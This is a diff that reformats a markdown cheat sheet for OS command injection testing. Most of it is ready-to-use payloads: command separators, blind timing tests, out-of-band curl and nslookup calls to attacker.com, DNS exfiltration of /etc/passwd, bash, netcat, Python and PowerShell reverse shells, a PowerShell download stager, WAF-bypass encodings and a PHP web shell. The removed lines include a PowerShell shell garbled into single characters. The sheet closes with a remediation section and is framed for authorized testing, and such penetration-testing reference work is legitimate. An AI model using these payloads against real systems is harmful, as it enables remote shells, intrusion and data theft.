@@ -2,50 +2,50 @@
 
 ## 🎯 Quick Checklist
 
-### 1. Identify Entry Points
-- [ ] URL parameters (`?id=1&file=test`)
-- [ ] POST data (forms, JSON, XML)
-- [ ] Headers (User-Agent, Referer, X-Forwarded-For)
-- [ ] Cookies
-- [ ] File uploads (filename)
-- [ ] API endpoints
+### 1) Identify Entry Points
+- URL parameters (`?id=1&file=test`)
+- POST data (forms, JSON, XML)
+- Headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
+- Cookies
+- File uploads (filename)
+- API endpoints
 
-### 2. Test Payloads (Start Simple)
+### 2) Test Payloads (Start Simple)
+```text
 ; whoami
 & whoami
 | whoami
 || whoami
 whoami
 $(whoami)
+```
 
-text
-
-### 3. Confirm Injection
+### 3) Confirm Injection
+```text
 ; echo test
 & echo test
 | echo test
 || echo test
+```
 
-text
+### 4) Determine OS
+```text
+; uname -a                 # Linux
+; ver                      # Windows
+; ping -c 1 127.0.0.1      # Linux
+; ping -n 1 127.0.0.1      # Windows
+```
 
-### 4. Determine OS
-; uname -a # Linux
-; ver # Windows
-; ping -c 1 127.0.0.1 # Linux
-; ping -n 1 127.0.0.1 # Windows
+### 5) Extract Information
 
-text
-
-### 5. Extract Information
-
-| Goal | Command |
-|------|---------|
-| Current user | `whoami` |
-| OS version | `uname -a` / `ver` |
-| Network | `ifconfig` / `ipconfig` |
-| Processes | `ps -ef` / `tasklist` |
-| Files | `ls -la` / `dir` |
-| System info | `cat /etc/passwd` / `type C:\Windows\win.ini` |
+| Goal | Linux | Windows |
+|------|-------|---------|
+| Current user | `whoami` | `whoami` |
+| OS version | `uname -a` | `ver` |
+| Network | `ifconfig` / `ip a` | `ipconfig` |
+| Processes | `ps -ef` | `tasklist` |
+| Files | `ls -la` | `dir` |
+| System info | `cat /etc/passwd` | `type C:\Windows\win.ini` |
 
 ---
 
@@ -53,29 +53,29 @@ text
 
 ### Inside Quotes
 If your input is inside quotes:
+```text
 ' ; whoami ; '
 " | whoami "
+```
 
-text
-
-### Inside Command with Spaces
+### Inside Command Without Spaces
+```text
 ;id
 |id
 ||id
 &id
-
-text
+```
 
 ### Multiple Commands
+```text
 whoami;id;uname -a
+```
 
-text
-
-### With Path
+### With Absolute Path
+```text
 ; /bin/ls -la
 ; C:\Windows\System32\whoami.exe
-
-text
+```
 
 ---
 
@@ -88,355 +88,133 @@ text
 | Linux | `; ping -c 10 127.0.0.1` |
 | Linux | `; sleep 10` |
 | Windows | `& ping -n 10 127.0.0.1` |
-| Windows | `& timeout 10` |
+| Windows | `& timeout /T 10 /NOBREAK` |
 
 ### Extract Output via Redirection
+```text
 ; whoami > /var/www/html/output.txt
 ; dir > C:\inetpub\wwwroot\output.txt
-
-text
+```
 
 ### OAST (Out-of-Band)
+```text
 ; nslookup attacker.com
 ; curl http://attacker.com
 ; ping -c 1 attacker.com
-
-text
+```
 
 ### Data Exfiltration via DNS
+```text
 ; nslookup whoami.attacker.com
 ; nslookup $(cat /etc/passwd | head -1).attacker.com
-
-text
+```
 
 ---
 
 ## 📋 Payload Categories
 
 ### Simple Detection
+```text
 ; echo [RANDOM]
 & echo [RANDOM]
 | echo [RANDOM]
 || echo [RANDOM]
-
-text
+```
 
 ### Command Chaining
+```text
 ; command
 & command
 | command
 || command
-
-text
+```
 
 ### Inline Execution (Unix)
-command
+```text
+`command`
 $(command)
-
-text
+```
 
 ### Bypass with Newline
+```text
 %0awhoami
 \nwhoami
-
-text
+```
 
 ### Terminate & Inject
+```text
 ; whoami #
 | whoami #
-
-text
+```
 
 ---
 
 ## 🚀 Reverse Shell One-Liners
 
 ### Linux
-; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
-; nc -e /bin/sh 10.0.0.1 4444
-; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+nc -e /bin/sh 10.0.0.1 4444
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
 
-text
+### Windows (PowerShell)
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 
-### Windows
-; powershell -c "
-c
-l
-i
-e
-n
-t
-=
-N
-e
-w
-−
-O
-b
-j
-e
-c
-t
-S
-y
-s
-t
-e
-m
-.
-N
-e
-t
-.
-S
-o
-c
-k
-e
-t
-s
-.
-T
-C
-P
-C
-l
-i
-e
-n
-t
-(
-′
-10.0.0.1
-′
-,
-4444
-)
-;
-client=New−ObjectSystem.Net.Sockets.TCPClient( 
-′
- 10.0.0.1 
-′
- ,4444);stream = 
-c
-l
-i
-e
-n
-t
-.
-G
-e
-t
-S
-t
-r
-e
-a
-m
-(
-)
-;
-[
-b
-y
-t
-e
-[
-]
-]
-client.GetStream();[byte[]]bytes = 0..65535|%{0};while((
-i
-=
-i=stream.Read(
-b
-y
-t
-e
-s
-,
-0
-,
-bytes,0,bytes.Length)) -ne 0){;
-d
-a
-t
-a
-=
-(
-N
-e
-w
-−
-O
-b
-j
-e
-c
-t
-−
-T
-y
-p
-e
-N
-a
-m
-e
-S
-y
-s
-t
-e
-m
-.
-T
-e
-x
-t
-.
-A
-S
-C
-I
-I
-E
-n
-c
-o
-d
-i
-n
-g
-)
-.
-G
-e
-t
-S
-t
-r
-i
-n
-g
-(
-data=(New−Object−TypeNameSystem.Text.ASCIIEncoding).GetString(bytes,0, 
-i
-)
-;
-i);sendback = (iex data 2>&1 | Out-String );sendback2 = 
-s
-e
-n
-d
-b
-a
-c
-k
-+
-′
-P
-S
-′
-+
-(
-p
-w
-d
-)
-.
-P
-a
-t
-h
-+
-′
->
-′
-;
-sendback+ 
-′
- PS 
-′
- +(pwd).Path+ 
-′
- > 
-′
- ;sendbyte = ([text.encoding]::ASCII).GetBytes(
-s
-e
-n
-d
-b
-a
-c
-k
-2
-)
-;
-sendback2);stream.Write(
-s
-e
-n
-d
-b
-y
-t
-e
-,
-0
-,
-sendbyte,0,sendbyte.Length);stream.Flush()};client.Close()"
-
-text
+Alternative (stager):
+```powershell
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')"
+```
 
 ---
 
 ## 🛠️ Bypass WAF / Filters
 
 ### URL Encoding
-%3Bwhoami # ;
-%26whoami # &
-%7Cwhoami # |
-%60whoami # `
-%24%28whoami%29 # $(whoami)
-
-text
+```text
+%3Bwhoami              # ;
+%26whoami              # &
+%7Cwhoami              # |
+%60whoami              # `
+%24%28whoami%29        # $(whoami)
+```
 
 ### Double URL Encoding
+```text
 %253Bwhoami
-
-text
+```
 
 ### Case Variation
+```text
 ; WhOaMi
 ; wHoAmI
-
-text
+```
 
 ### Command Substitution
+```text
 $(echo whoami)
-echo whoami
-
-text
+`echo whoami`
+```
 
 ### Concatenation
+```text
 ; w'h'o'a'm'i
 ; w"h"o"a"m"i
-
-text
+```
 
 ### Wildcards
-; /???/??whoami # /bin/whoami
+```text
+; /???/??whoami
 ; /usr/bin/w*ami
-
-text
+```
 
 ### Variables
+```text
 ; whoam$()i
 ; wh$1oami
-
-text
+```
 
 ---
 
@@ -446,33 +224,52 @@ text
 
 ```php
 <?php
-if(isset($_GET['cmd'])) {
+if (isset($_GET['cmd'])) {
     system($_GET['cmd']);
 }
 ?>
-Test locally
+```
 
-text
+Test locally:
+```bash
 curl "http://localhost/test.php?cmd=whoami"
-🧰 Tools Reference
+```
 
-Tool	Purpose
-Burp Suite	Manual testing, automation
-Commix	Automated injection
-SQLMap	--os-shell for RCE
-Netcat	Reverse shell
-Custom scripts	Automation
-Commix Quick Start
+---
 
-text
+## 🧰 Tools Reference
+
+| Tool | Purpose |
+|------|---------|
+| Burp Suite | Manual testing, automation |
+| Commix | Automated command injection testing |
+| SQLMap | `--os-shell` for command execution paths |
+| Netcat | Reverse shell listener |
+| Custom scripts | Automation and chaining |
+
+Commix quick start:
+```bash
 commix -u "http://target.com/page.php?cmd=test" --data="param=test"
-✅ Final Checklist Before Reporting
+```
 
-Confirmed injection exists
-Identified OS
-Extracted system info
-Tested blind (if needed)
-Escalated to RCE (if possible)
-Documented with screenshots
-Proposed remediation
-Removed created files/shells
+---
+
+## ✅ Final Checklist Before Reporting
+- Confirmed injection exists
+- Identified target OS
+- Extracted system information
+- Tested blind channel (if needed)
+- Validated impact / potential RCE
+- Documented reproducible steps and screenshots
+- Proposed remediation
+- Removed created files/shells (during authorized testing)
+
+---
+
+## 🛡️ Remediation (Defender View)
+- Avoid shell execution APIs when possible (`system`, `exec`, `popen`, etc.).
+- Use allowlists for expected input values.
+- Use safe parameterized APIs (no command string concatenation).
+- Run services with least privilege.
+- Isolate execution context (containers, seccomp, AppArmor).
+- Add monitoring for suspicious subprocess and outbound DNS/HTTP traffic.
